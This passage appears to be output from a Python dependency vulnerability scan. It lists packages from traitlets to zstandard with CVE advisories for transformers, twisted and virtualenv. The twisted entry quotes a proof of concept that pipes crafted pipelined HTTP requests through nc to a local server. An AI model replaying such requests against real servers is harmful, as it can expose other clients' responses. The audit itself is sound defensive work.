{"name": "traitlets", "version": "5.14.3", "vulns": []}, {"name": "transformers", "version": "4.45.0", "vulns": [{"id": "PYSEC-2024-227", "fix_versions": ["4.48.0"], "aliases": ["CVE-2024-11392"], "description": "Hugging Face Transformers MobileViTV2 Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the handling of configuration files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-24322."}, {"id": "PYSEC-2024-229", "fix_versions": ["4.48.0"], "aliases": ["CVE-2024-11394"], "description": "Hugging Face Transformers Trax Model Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the handling of model files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-25012."}, {"id": "PYSEC-2024-228", "fix_versions": ["4.48.0"], "aliases": ["CVE-2024-11393"], "description": "Hugging Face Transformers MaskFormer Model Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the parsing of model files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-25191."}, {"id": "PYSEC-2025-40", "fix_versions": ["4.49.0"], "aliases": ["CVE-2025-2099"], "description": "A vulnerability in the `preprocess_string()` function of the `transformers.testing_utils` module in huggingface/transformers version v4.48.3 allows for a Regular Expression Denial of Service (ReDoS) attack. The regular expression used to process code blocks in docstrings contains nested quantifiers, leading to exponential backtracking when processing input with a large number of newline characters. An attacker can exploit this by providing a specially crafted payload, causing high CPU usage and potential application downtime, effectively resulting in a Denial of Service (DoS) scenario."}, {"id": "GHSA-6rvg-6v2m-4j46", "fix_versions": ["4.48.0"], "aliases": ["CVE-2024-12720"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was identified in the huggingface/transformers library, specifically in the file tokenization_nougat_fast.py. The vulnerability occurs in the post_process_single() function, where a regular expression processes specially crafted input. The issue stems from the regex exhibiting exponential time complexity under certain conditions, leading to excessive backtracking. This can result in significantly high CPU usage and potential application downtime, effectively creating a Denial of Service (DoS) scenario. The affected version is v4.46.3."}, {"id": "GHSA-fpwr-67px-3qhx", "fix_versions": ["4.50.0"], "aliases": ["CVE-2025-1194"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was identified in the huggingface/transformers library, specifically in the file `tokenization_gpt_neox_japanese.py` of the GPT-NeoX-Japanese model. The vulnerability occurs in the SubWordJapaneseTokenizer class, where regular expressions process specially crafted inputs. The issue stems from a regex exhibiting exponential complexity under certain conditions, leading to excessive backtracking. This can result in high CPU usage and potential application downtime, effectively creating a Denial of Service (DoS) scenario. The affected version is v4.48.1 (latest)."}]}, {"name": "tree", "version": "0.2.4", "vulns": []}, {"name": "trio", "version": "0.30.0", "vulns": []}, {"name": "trio-websocket", "version": "0.10.4", "vulns": []}, {"name": "twisted", "version": "22.10.0", "vulns": [{"id": "PYSEC-2023-224", "fix_versions": ["23.10.0rc1"], "aliases": ["GHSA-xc8x-vp79-p3wm", "CVE-2023-46137"], "description": "Twisted is an event-based framework for internet applications. Prior to version 23.10.0rc1, when sending multiple HTTP requests in one TCP packet, twisted.web will process the requests asynchronously without guaranteeing the response order. If one of the endpoints is controlled by an attacker, the attacker can delay the response on purpose to manipulate the response of the second request when a victim launched two requests using HTTP pipeline. Version 23.10.0rc1 contains a patch for this issue."}, {"id": "PYSEC-2024-75", "fix_versions": ["24.7.0rc1"], "aliases": ["CVE-2024-41810", "GHSA-cf56-g6w6-pqq2"], "description": "Twisted is an event-based framework for internet applications, supporting Python 3.6+. The `twisted.web.util.redirectTo` function contains an HTML injection vulnerability. If application code allows an attacker to control the redirect URL this vulnerability may result in Reflected Cross-Site Scripting (XSS) in the redirect response HTML body. This vulnerability is fixed in 24.7.0rc1."}, {"id": "GHSA-c8m8-j448-xjx7", "fix_versions": ["24.7.0rc1"], "aliases": ["CVE-2024-41671"], "description": "### Summary  The HTTP 1.0 and 1.1 server provided by twisted.web could process pipelined HTTP requests out-of-order, possibly resulting in information disclosure.  ### PoC 0. Start a fresh Debian container: ```sh docker run --workdir /repro --rm -it debian:bookworm-slim ``` 1. Install twisted and its dependencies: ```sh apt -y update && apt -y install ncat git python3 python3-pip \\     && git clone --recurse-submodules https://github.com/twisted/twisted \\     && cd twisted \\     && pip3 install --break-system-packages . ``` 2. Run a twisted.web HTTP server that echos received requests' methods. e.g., the following: ```python from twisted.web import server, resource from twisted.internet import reactor  class TheResource(resource.Resource):     isLeaf = True      def render_GET(self, request) -> bytes:         return b\"GET\"      def render_POST(self, request) -> bytes:         return b\"POST\"  site = server.Site(TheResource()) reactor.listenTCP(80, site) reactor.run() ``` 3. Send it a POST request with a chunked message body, pipelined with another POST request, wait a second, then send a GET request on the same connection: ```sh (printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nContent-Length: 0\\r\\n\\r\\n'; sleep 1; printf 'GET / HTTP/1.1\\r\\n\\r\\n'; sleep 1) | nc localhost 80 ``` 4. Observe that the responses arrive out of order: ``` HTTP/1.1 200 OK Server: TwistedWeb/24.3.0.post0 Date: Tue, 09 Jul 2024 06:19:41 GMT Content-Length: 5 Content-Type: text/html  POST HTTP/1.1 200 OK Server: TwistedWeb/24.3.0.post0 Date: Tue, 09 Jul 2024 06:19:42 GMT Content-Length: 4 Content-Type: text/html  GET HTTP/1.1 200 OK Server: TwistedWeb/24.3.0.post0 Date: Tue, 09 Jul 2024 06:19:42 GMT Content-Length: 5 Content-Type: text/html  POST ```  ### Impact See [GHSA-xc8x-vp79-p3wm](https://github.com/twisted/twisted/security/advisories/GHSA-xc8x-vp79-p3wm). Further, for instances of twisted.web HTTP servers deployed behind reverse proxies that implement connection pooling, it may be possible for remote attackers to receive responses intended for other clients of the twisted.web server."}]}, {"name": "typer", "version": "0.16.0", "vulns": []}, {"name": "types-beautifulsoup4", "version": "4.12.0.6", "vulns": []}, {"name": "types-colorama", "version": "0.4.15.12", "vulns": []}, {"name": "types-html5lib", "version": "1.1.11.15", "vulns": []}, {"name": "types-markdown", "version": "3.4.2.10", "vulns": []}, {"name": "types-pillow", "version": "10.0.0.3", "vulns": []}, {"name": "types-psutil", "version": "5.9.5.17", "vulns": []}, {"name": "types-psycopg2", "version": "2.9.21.20241019", "vulns": []}, {"name": "types-pyautogui", "version": "0.9.3.1", "vulns": []}, {"name": "types-pyscreeze", "version": "1.0.1.20240822", "vulns": []}, {"name": "types-pytz", "version": "2023.3.0.1", "vulns": []}, {"name": "types-pyyaml", "version": "6.0.12.20240917", "vulns": []}, {"name": "types-requests", "version": "2.31.0.2", "vulns": []}, {"name": "types-urllib3", "version": "1.26.25.14", "vulns": []}, {"name": "typing-extensions", "version": "4.5.0", "vulns": []}, {"name": "typing-inspect", "version": "0.8.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.1", "vulns": []}, {"name": "tzdata", "version": "2023.3", "vulns": []}, {"name": "tzlocal", "version": "5.2", "vulns": []}, {"name": "uc-micro-py", "version": "1.0.1", "vulns": []}, {"name": "ujson", "version": "5.4.0", "vulns": []}, {"name": "ultralytics", "version": "8.3.155", "vulns": []}, {"name": "ultralytics-thop", "version": "2.0.14", "vulns": []}, {"name": "unidecode", "version": "1.2.0", "vulns": []}, {"name": "uritemplate", "version": "3.0.1", "vulns": []}, {"name": "urllib3", "version": "2.5.0", "vulns": []}, {"name": "urllib3-secure-extra", "version": "0.1.0", "vulns": []}, {"name": "uvicorn", "version": "0.33.0", "vulns": []}, {"name": "uvloop", "version": "0.17.0", "vulns": []}, {"name": "vcrpy", "version": "4.2.1", "vulns": []}, {"name": "virtualenv", "version": "20.24.5", "vulns": [{"id": "PYSEC-2024-187", "fix_versions": ["20.26.6"], "aliases": ["CVE-2024-53899"], "description": "virtualenv before 20.26.6 allows command injection through the activation scripts for a virtual environment. Magic template strings are not quoted correctly when replacing. NOTE: this is not the same as CVE-2024-9287."}]}, {"name": "w3lib", "version": "1.21.0", "vulns": []}, {"name": "wasabi", "version": "1.1.2", "vulns": []}, {"name": "watchdog", "version": "2.1.6", "vulns": []}, {"name": "watchfiles", "version": "0.20.0", "vulns": []}, {"name": "wcmatch", "version": "8.5.2", "vulns": []}, {"name": "wcwidth", "version": "0.2.5", "vulns": []}, {"name": "webdriver-manager", "version": "4.0.0", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websocket-client", "version": "1.8.0", "vulns": []}, {"name": "websockets", "version": "15.0.1", "vulns": []}, {"name": "werkzeug", "version": "3.1.3", "vulns": []}, {"name": "whatthepatch", "version": "1.0.2", "vulns": []}, {"name": "wheel", "version": "0.38.4", "vulns": []}, {"name": "widgetsnbextension", "version": "4.0.5", "vulns": []}, {"name": "wkhtmltopdf", "version": "0.2", "vulns": []}, {"name": "wrapt", "version": "1.14.1", "vulns": []}, {"name": "wsproto", "version": "1.2.0", "vulns": []}, {"name": "wurlitzer", "version": "3.0.2", "vulns": []}, {"name": "xarray", "version": "2023.6.0", "vulns": []}, {"name": "xlsxwriter", "version": "3.2.3", "vulns": []}, {"name": "xlwings", "version": "0.29.1", "vulns": []}, {"name": "xxhash", "version": "2.0.2", "vulns": []}, {"name": "xyzservices", "version": "2022.9.0", "vulns": []}, {"name": "y-py", "version": "0.5.9", "vulns": []}, {"name": "yapf", "version": "0.31.0", "vulns": []}, {"name": "yarl", "version": "1.8.1", "vulns": []}, {"name": "ypy-websocket", "version": "0.8.2", "vulns": []}, {"name": "zict", "version": "2.2.0", "vulns": []}, {"name": "zipp", "version": "3.11.0", "vulns": []}, {"name": "zope-event", "version": "5.0", "vulns": []}, {"name": "zope-interface", "version": "5.4.0", "vulns": []}, {"name": "zstandard", "version": "0.19.0", "vulns": []}], "fixes": []}
